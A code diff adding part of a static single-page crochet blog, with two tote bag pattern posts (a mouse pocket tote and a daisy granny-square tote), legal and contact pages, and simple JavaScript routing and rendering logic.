+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Pastel Crochet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Summer Bag Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cotton Yarn Craft</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Shoulder Bag</span>
+</div>`
+            },
+            {
+                id: 'cute-mouse-tote-bag-crochet-pattern',
+                title: 'Cute Mouse Tote Bag Crochet Pattern',
+                date: 'April 24, 2026',
+                image: './assets/Cute Mouse Tote Bag Crochet Pattern.png',
+                excerpt: `Add irresistible charm to your everyday carry with this cute mouse tote bag crochet pattern! 🐭 This design features a structured cream shoulder tote with a front patch pocket where a cuddly 3D amigurumi mouse peeks out, complete with pink inner ears, sweet paws, and a long curly tail draped over the front.
+• Sturdy, practical tote bag paired with an adorable removable or stitched amigurumi mascot.
+• Step-by-step beginner friendly instructions for both bag body and amigurumi details.
+Save this cute mouse tote bag pattern for your next whimsical crochet gift! 🧶 #MouseTote #AmigurumiBag #CuteCrochet #CrochetPattern #HandmadeTote`,
+                content: `<p>Handmade bags are already special, but adding an interactive, character-driven element takes them to a whole new level of whimsical creativity. This cute mouse tote bag crochet pattern pairs a classic, minimalist cream shoulder tote with an adorable amigurumi mouse nestled snugly inside a dedicated front patch pocket. With its rounded pink inner ears, sweet embroidered nose, white thread whiskers, and playful long pink tail draping down the front, this tote is guaranteed to turn heads and spark joy wherever you go.</p>
+<p>Whether you are making a charming gift for a book lover, an animal enthusiast, a student, or simply treating yourself to a cozy conversation starter, this project offers the best of both worlds: practical accessory construction combined with delightful amigurumi toy making.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Combines a structured flat-bottom tote bag with a 3D amigurumi pocket companion.</li>
+    <li>The front pocket holds the mouse character securely while allowing it to peek out over the top edge.</li>
+    <li>Features realistic details including cupped two-tone ears, tiny paws, whiskers, and a long curly pink tail.</li>
+    <li>Constructed with sturdy cotton yarn to maintain crisp lines and prevent fabric distortion.</li>
+    <li>Beginner friendly step-by-step shaping that works up quickly using standard single crochet.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Design Concept: A Living Storybook in Yarn</h2>
+<p>What makes this bag so uniquely appealing is the interactive illusion of a tiny mouse making its home in your front pocket. The tote body provides a clean, elegant neutral canvas worked in tight cream or oatmeal single crochet stitches.</p>
+<p>On the front wall, a dimensional pocket is stitched with enough room for the little mouse to sit comfortably. The mouse head and paws are angled so the paws grip the pocket rim, creating a playful 3D effect that looks lively and dimensional from every angle.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Anatomy of the 3D Amigurumi Mouse</h3>
+<p>The mouse companion is worked using traditional amigurumi spiral techniques. The grey head is shaped with gradual increases to create chubby cheeks, while the ears feature pink inner rounds surrounded by a grey border. The sweet pink nose, black safety eyes, and nylon or cotton thread whiskers give the character an expressive, storybook personality.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> When attaching safety eyes or stuffing the mouse head, ensure the washers are firmly locked in place before closing the head. If making this bag for a young child under 3 years old, embroider the eyes with black cotton floss instead of using plastic safety eyes.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Yarn and Tool Recommendations</h2>
+<p>To ensure both the bag and the amigurumi mascot hold their shape perfectly, choosing the right yarn and hook combination is essential:</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Materials List</h4>
+<ul>
+  <li><strong>Main Tote Yarn:</strong> 3 skeins (approx. 300g) worsted weight cotton or cotton blend in Cream or Natural Ecru.</li>
+  <li><strong>Mouse Amigurumi Yarn:</strong> 1 small skein (approx. 50g) in Heather Grey and 1 small skein in Soft Baby Pink.</li>
+  <li><strong>Crochet Hooks:</strong> 4.5 mm hook for the main tote body and 3.0 mm hook for the mouse pieces.</li>
+  <li><strong>Notions:</strong> 8mm black safety eyes, polyfill stuffing, tapestry needle, stitch markers, and scissors.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Using a smaller hook (3.0 mm) for the amigurumi head creates tight stitches that completely prevent white stuffing from poking through the grey yarn.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p>You can choose to sew the mouse permanently into the pocket for a secure everyday bag, or leave it unattached as a removable plush toy that can be popped in and out of the pocket during play.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Step-by-Step Making Process</h2>
+<ol>
+  <li><strong>Crochet the Bag Base:</strong> Start with an oval foundation chain and work continuous rounds of single crochet, increasing at each rounded end until the base reaches 28 cm across.</li>
+  <li><strong>Work the Tote Walls:</strong> Continue straight in single crochet without increasing for approximately 35 rounds to reach a clean, structured tote height.</li>
+  <li><strong>Stitch and Attach the Pocket:</strong> Work a separate square swatch of single crochet (approx. 14 cm by 14 cm) with rounded bottom corners. Pin it to the center front of the bag and topstitch around three sides, leaving the top edge open.</li>
+  <li><strong>Assemble the Mouse Mascot:</strong> Crochet the grey head, two-tone ears, snout, front paws, and a long pink cord tail. Stuff firmly, embroider facial whiskers, and stitch the paws over the pocket lip.</li>
+  <li><strong>Add Shoulder Straps:</strong> Crochet two sturdy strap bands (approx. 65 cm long) and join them to the inner rim with reinforced backstitching.</li>
+</ol>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling and Gifting Ideas</h2>
+<p>This adorable tote is the ultimate conversation piece. Pack it with craft supplies, your current crochet work in progress, journal supplies, or library books. It also makes an unforgettable handcrafted gift for birthdays, baby showers, or back-to-school season.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Skill Level: Easy to Intermediate.</li>
+    <li>Techniques: Continuous spiral amigurumi, flat crochet, pocket seaming.</li>
+    <li>Features: Front patch pocket with 3D mouse character and long pink tail.</li>
+    <li>Dimensions: Tote: 30 cm wide x 34 cm high; Pocket: 14 cm x 14 cm.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Bring Joy to Your Everyday Routine</h2>
+<p>The cute mouse tote bag proves that handmade accessories can be functional, durable, and brimming with personality. With clear step-by-step instructions and simple foundational stitches, you can bring this sweet companion to life in just a couple of cozy stitching evenings. Grab your yarn, cast on your first stitches, and let your creativity shine!</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mouse Crochet Tote</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Amigurumi Bag Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Animal Pocket Tote</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cute Crochet Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Market Bag</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Crochet Gifts</span>
+</div>`
+            },
+            {
+                id: 'daisy-granny-tote-pattern',
+                title: 'Daisy Granny Tote Pattern',
+                date: 'April 12, 2026',
+                image: './assets/Daisy Granny Tote Pattern.png',
+                excerpt: `Transform yarn into an heirloom accessory with this dreamy daisy granny tote pattern! 🌼 Featuring cheerful white and golden yellow daisy flower centers framed in soft dusty rose pink, these diagonal diamond-set granny squares create a gorgeous vintage-inspired market bag that is both practical and durable.
+• Diamond motif layout creates an eye-catching scalloped top rim and sturdy structure.
+• Beginner friendly floral squares join quickly for a rewarding, portable weekend project.
+Save this floral daisy granny square tote pattern for your spring crafting list! 🌸 #DaisyCrochet #GrannySquareTote #FloralCrochet #VintageCraft #CrochetBag`,
+                content: `<p>Granny square bags have earned a permanent place in the heart of the handmade fashion movement. Among the countless motif variations, the daisy granny square stands out as an eternal favorite: radiating spring optimism, vintage cottagecore charm, and delicate botanical elegance. This daisy granny tote pattern transforms individual floral blocks into a stunning diagonal diamond-layout shoulder bag in soft dusty rose pink, sunny golden yellow, and crisp white.</p>
+<p>Whether you are heading to a weekend flower market, meeting friends for iced coffee, or packing a sunny day picnic, this versatile tote brings a handmade heirloom touch to every outfit. Let us explore the materials, diamond joining techniques, and edge finishing that will make your daisy tote a timeless masterpiece.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Individual squares feature a textured 3D daisy flower center built with puffy cluster stitches.</li>
+    <li>Arranging the squares on the diagonal (diamond orientation) naturally forms elegant scalloped peaks along the bag rim.</li>
+    <li>Worked in soft dusty rose, warm mustard yellow, and ivory cream for a modern vintage aesthetic.</li>
+    <li>Can be constructed using 13 or 15 standard granny squares joined with continuous invisible seaming.</li>
+    <li>Durable double crochet strap borders prevent stretching while offering comfortable shoulder carry.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Daisy Square Anatomy: From Center Petals to Square Frame</h2>
+<p>Each floral square starts with a bright golden-yellow circle worked into a magic ring. In the second round, petal stitches are formed using puffy cluster stitches (or popcorn stitches) in crisp white yarn. These raised stitches give each daisy realistic 3D texture that catches the light and pops off the fabric.</p>
+<p>In the final rounds, the round daisy blossom is framed into a neat 4-cornered square using soft dusty rose pink yarn. By balancing corner chain spaces with side double crochets, each block lays completely flat with sharp, crisp 90-degree corners.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The 13-Square Diamond Layout Strategy</h3>
+<p>The magic of this bag's shape comes from its diagonal assembly. Instead of joining squares in a conventional grid, the squares are rotated 45 degrees into diamonds. Folding the base squares creates a deep, three-dimensional bucket shape with natural V-neck dips along the top rim where the shoulder straps attach seamlessly.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Wet block or steam block every single daisy square before assembly. Ensuring all squares share identical dimensions guarantees that seams align perfectly with zero puckering or uneven tension.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Materials, Tools, and Color Selection</h2>
+<p>High quality cotton yarn provides the ideal drape, stitch clarity, and durability for this floral tote project:</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Project Supplies</h4>
+<ul>
+  <li><strong>Background Yarn:</strong> 3 skeins (approx. 250g) of DK or worsted weight cotton in Dusty Rose / Pastel Lilac Pink.</li>
+  <li><strong>Petal Yarn:</strong> 1 skein (approx. 100g) in Crisp Ivory White.</li>
+  <li><strong>Center Flower Yarn:</strong> 1 small skein (approx. 50g) in Warm Honey / Mustard Yellow.</li>
+  <li><strong>Crochet Hook:</strong> 3.75 mm or 4.0 mm hook (for tight, durable granny clusters).</li>
+  <li><strong>Blocking Essentials:</strong> Foam blocking board, stainless steel T-pins, and a handheld steamer or spray bottle.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Use the "Join-As-You-Go" (JAYG) method on the final pink round of each square to seam your bag together in one fluid step, saving hours of tapestry needle sewing at the end.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p>To give the handles long-lasting strength that never stretches out under weight, crochet the strap border in continuous rounds along the inner and outer rim of the handle simultaneously. This dual-edge binding locks the stitches firmly in place.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Step-by-Step Creation Journey</h2>
+<ol>
+  <li><strong>Crochet 13 Daisy Squares:</strong> Work each square from golden center to white petals and finish with two rounds of dusty rose frame.</li>
+  <li><strong>Block All Squares:</strong> Pin squares to uniform 10 cm x 10 cm dimensions and let dry completely.</li>
+  <li><strong>Assemble the Diamond Grid:</strong> Lay out the squares in the classic 13-square tote arrangement (3 squares wide by 3 squares tall on point, with 2 base squares and 2 side folding squares).</li>
+  <li><strong>Join the Seams:</strong> Use a flat slip-stitch join on the wrong side or the mattress stitch on the right side for a smooth, ridge-free seam.</li>
+  <li><strong>Add Top Edging and Straps:</strong> Work single crochet stitches around the scalloped upper rim, chaining across each peak to form the shoulder straps, then work two reinforcing rounds of single crochet around the handles.</li>
+</ol>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling Your Floral Granny Bag</h2>
+<p>The soft dusty rose tones paired with cheerful white daisies create an effortless romantic look. Style your tote with a flowy midi dress and canvas sneakers for farmer market weekends, or pair it with wide-leg linen trousers and a simple tank top for casual summer errands.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Skill Level: Beginner Friendly.</li>
+    <li>Motif Count: 13 floral granny squares.</li>
+    <li>Dimensions: Approx. 32 cm wide by 36 cm high (excluding handles).</li>
+    <li>Key Techniques: Popcorn petal stitches, diagonal diamond joining, integrated straps.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: A Lasting Keepsake Made by Hand</h2>
+<p>The daisy granny tote captures everything we love about crochet: it is relaxing to stitch square by square, highly portable to work on during travel, and results in a gorgeous, durable accessory that will be treasured for seasons to come. Gather your pastel yarn, pick up your hook, and start your creation journey today!</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Daisy Granny Square</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Tote Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Floral Crochet Bag</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Pastel Granny Bag</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Handmade Market Tote</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">DIY Crochet Keepsake</span>
+</div>`
+            }
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>Crochet Bags Craft</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and cozy corner on the internet where makers of all skill levels can discover free crochet bag patterns, step-by-step tote tutorials, yarn guides, and creative handmade inspiration.</p>
+                    <p>Whether you are here to stitch your very first chunky hobo bag, explore colorful striped market totes, or craft a whimsical daisy granny square accessory, we are thrilled to have you in our crafting community.</p>
+                    <p>Thank you for stopping by and sharing our passion for handmade crochet fashion!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Crochet Bags Craft, one of our main priorities is the privacy of our visitors. This Privacy Policy document outlines the types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provisions of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our crochet bag patterns, need assistance with a technique, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@crochetbagscraft.github.io">contact@crochetbagscraft.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Crochet Bags Craft";
+        const avatarUrl = "./assets/blog-avatar.png";
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <div class="post-header-left">
+                                <img class="avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://via.placeholder.com/50?text=👜'">
+                                <span class="username">${blogUsername}</span>
+                            </div>
+                            <span class="post-tag-pill">Pattern Guide</span>
+                        </div>
+                        <div class="post-image-wrapper">
+                            <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/600x450?text=Crochet+Bag+Pattern'">
+                        </div>
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt.replace(/\\n/g, '<br>')}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <div class="actions">
+                                <span>🧶</span>
+                                <span>♥</span>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+
+            if (!page) {
+                app.innerHTML = `<p>Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Home</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Home</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 36px; padding-bottom: 36px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+
+            if (!post) {
+                app.innerHTML = `<p>Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Home</a>`;
+                return;
+            }
+
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Home</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <div class="post-header-left">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://via.placeholder.com/50?text=👜'">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <span class="post-tag-pill">Bag Pattern</span>
+                    </div>
+                    <div class="post-image-wrapper">
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/600x450?text=Crochet+Bag+Pattern'">
+                    </div>
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <div class="actions">
+                            <span>🧶</span>
+                            <span>♥</span>
+                        </div>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
